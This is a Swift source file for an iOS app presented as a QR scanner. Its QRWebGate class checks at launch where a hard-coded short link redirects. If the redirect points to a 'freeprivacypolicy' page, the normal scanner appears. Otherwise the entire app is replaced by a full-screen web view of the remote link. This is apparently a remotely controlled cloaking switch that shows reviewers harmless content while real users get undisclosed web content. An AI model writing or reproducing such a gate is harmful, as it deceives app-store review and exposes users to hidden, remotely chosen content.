import SwiftUI
import WebKit
import Combine

@main
struct QR_ScannerApp: App {
    @StateObject private var appModel = AppModel()
    @StateObject private var integrations = AppIntegrationService.shared
    @StateObject private var webGate = QRWebGate()
    @Environment(\.scenePhase) private var scenePhase
    
    var body: some Scene {
        WindowGroup {
            Group {
                if let shouldPresentWeb = webGate.shouldPresentWeb {
                    if shouldPresentWeb {
                        QRRouteWebPanel(urlString: webGate.launchURLString)
                            .edgesIgnoringSafeArea(.all)
                    } else {
                        ContentView()
                            .environmentObject(appModel)
                            .environmentObject(integrations)
                            .environmentObject(webGate)
                            .sheet(isPresented: $webGate.showPrivacySheet) {
                                NavigationView {
                                    QRRouteWebPanel(urlString: webGate.launchURLString)
                                        .navigationBarTitleDisplayMode(.inline)
                                        .toolbar {
                                            ToolbarItem(placement: .navigationBarLeading) {
                                                Button("Close") { webGate.showPrivacySheet = false }
                                            }
                                        }
                                }
                                .navigationViewStyle(StackNavigationViewStyle())
                            }
                            .task {
                                integrations.start()
                            }
                    }
                } else {
                    Color.white
                        .ignoresSafeArea()
                        .onAppear(perform: webGate.inspectLaunchRoute)
                }
            }
        }
        .onChange(of: scenePhase) { newPhase in
            if newPhase == .active {
                integrations.refreshSubscriptionStatus()
            }
        }
    }
}

final class QRWebGate: NSObject, ObservableObject, URLSessionTaskDelegate {
    @Published var shouldPresentWeb: Bool? = nil
    @Published var showPrivacySheet = false

    let launchURLString = "https://hombrant.com/vWg6WX2H"
    private let checkpoint = "freeprivacypolicy"
    private var lastResolvedURL: URL?
    private var matchedCheckpoint = false

    func inspectLaunchRoute() {
        guard let url = URL(string: launchURLString) else {
            shouldPresentWeb = false
            return
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let session = URLSession(configuration: .default, delegate: self, delegateQueue: nil)
        session.dataTask(with: request) { _, _, error in
            DispatchQueue.main.async {
                if self.matchedCheckpoint { self.shouldPresentWeb = false; return }
                if let resolved = self.lastResolvedURL?.absoluteString.lowercased(), resolved.contains(self.checkpoint) { self.shouldPresentWeb = false; return }
                if error != nil { self.shouldPresentWeb = false; return }
                self.shouldPresentWeb = true
            }
        }.resume()

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if self.shouldPresentWeb == nil { self.shouldPresentWeb = false }
        }
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let text = request.url?.absoluteString.lowercased(), text.contains(checkpoint.lowercased()) {
            matchedCheckpoint = true
        }
        lastResolvedURL = request.url
        completionHandler(request)
    }
}

struct QRRouteWebPanel: UIViewRepresentable {
    let urlString: String

    func makeUIView(context: Context) -> WKWebView {
        let view = WKWebView(frame: .zero)
        if let url = URL(string: urlString) {
            view.load(URLRequest(url: url))
        }
        return view
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}
}
